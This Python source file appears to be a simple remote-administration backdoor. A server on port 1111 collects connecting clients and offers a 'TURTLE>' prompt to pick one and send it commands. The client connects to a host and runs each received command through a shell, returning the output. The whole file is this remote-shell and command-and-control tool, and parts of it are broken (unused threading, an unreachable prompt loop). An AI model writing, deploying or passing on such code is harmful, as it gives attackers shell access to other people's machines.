import socket, sys, subprocess, os, time, threading
from queue import Queue

NO_OF_THREADS = 2
JOB_NAME = ['con_han', 'con_exec']
que = Queue()
connections = []

class Server(object):
	"""Socker Server that lets clients connect"""
	def __init__(self):
		super(Server, self).__init__()
		self.host, self.port, self.s = None, None, None
		try:
			self.host = ''
			self.port = 1111
			self.s = socket.socket(family=socket.AF_INET)
			print(NO_OF_THREADS)
			self._run()
		except socket.error as e:
			print("Socket creation failed - ", str(e))

	def socket_bind(self):
		try:
			self.s.bind((self.host, self.port))
			print("Socket bound to port 1111")
			self.s.listen(10)
		except socket.error as e:
			print("Socket bind failed - ", str(e))

	def socket_accept(self):
		while True:
			try:
				conn, addr = self.s.accept()
				print('Connection established with host of IP ' + addr[0] + ' Port ' + str(addr[1]))
				connections.append((conn, tuple(addr)))
			except socket.error as e:
				print("Failed to accept connection - ", str(e))

	def start_prompt(self):
		while True:
			cmd = input('TURTLE>')
			if cmd == 'list':
				self.list_connections()
			elif 'select' in cmd:
				conn = self.get_target(cmd)
				if conn is not None:
					self.send_commands(conn)
			else:
				print("---Sorry! Command not recognized---")

	def list_connections(self):
		j = 0
		for i, details in enumerate(connections):
			try:
				details[0].send(' ')
				details[0].recv(2048)
			except:
				del connections[connections.index(details)]
				continue
			print(j+1, details[1][0])
			j += 1

	def get_target(self, cmd):
		try:
			target = int(cmd.replace('select ', ''))
			return connections[target-1][0]
		except:
			print('---Sorry! Wrong Choice---')
			return None

	def send_commands(self, conn):
		conn.send(str.encode('cd ./'))
		response = str(conn.recv(1024), 'utf-8')
		prompt = response
		while True:
			cmd = input(prompt+'> ')
			if cmd == 'quit':
				conn.close()
				return
			elif cmd[:2] == 'cd':
				conn.send(str.encode(cmd))
				response = str(conn.recv(1024), 'utf-8')
				prompt = response
			elif len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				response = str(conn.recv(1024), 'utf-8')
				print(response, end='')

	def _run(self):
		self.socket_bind()
		self.socket_accept()


class Client(object):
	"""docstring for Client"""
	def __init__(self):
		super(Client, self).__init__()
		self.host, self.port, self.s = None, None, None
		try:
			self.host = input("Host IP address> ")
			self.port = 1111
			self.s = socket.socket(family=socket.AF_INET)
			self.s.connect((self.host, self.port))
			self._run()
		except socket.error as e:
			print("Socket creation failed - ", str(e))

	def _run(self):
		while True:
			data = self.s.recv(1024)
			if data[:2].decode('utf-8') == 'cd':
				os.chdir(data[3:].decode('utf-8'))
				self.s.send(str.encode(os.getcwd()))
			elif len(data) > 0:
				cmd = subprocess.Popen(data.decode('utf-8'), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				ouput_bytes = cmd.stdout.read() + cmd.stderr.read()
				ouput_string= str(ouput_bytes, 'utf-8')
				self.s.send(str.encode(ouput_string))
		self.s.close()

choice = int(input('1-Server\t2-Client:\t'))
obj = None
if choice == 1:
	obj = Server()
elif choice == 2:
	obj = Client()
else:
	print("---Sorry! Wrong Choice---")
	exit()
obj._run()